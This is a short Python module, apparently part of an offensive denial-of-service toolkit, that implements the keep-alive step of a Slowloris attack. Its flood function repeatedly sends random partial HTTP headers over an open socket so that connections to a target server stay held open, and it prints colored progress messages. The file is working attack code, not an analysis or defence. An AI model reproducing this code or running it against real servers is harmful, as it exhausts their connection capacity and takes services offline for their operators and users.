"""This module provides the flood function for a Slowloris DoS attack."""

import random
import socket

from colorama import Fore  # type: ignore[import]

from tools.crash import CriticalError  # type: ignore[import]


def flood(sock: socket.SocketType) -> None:
    """Keep alive the sockets in Slowloris flood.

    Args:
        - sock - The socket to be kept alive

    Returns:
        None
    """
    try:
        header = f"X-a: {random.randint(1, 5000)}"
        sock.send(header.encode("utf-8"))
    except Exception as err:
        CriticalError("There was an error during the Slowloris attack", err)
    else:
        print(
            f"{Fore.GREEN} --> Keeping Socket Alive... {Fore.RESET}|{Fore.CYAN} Header Sent: {header}{Fore.RESET}"
        )
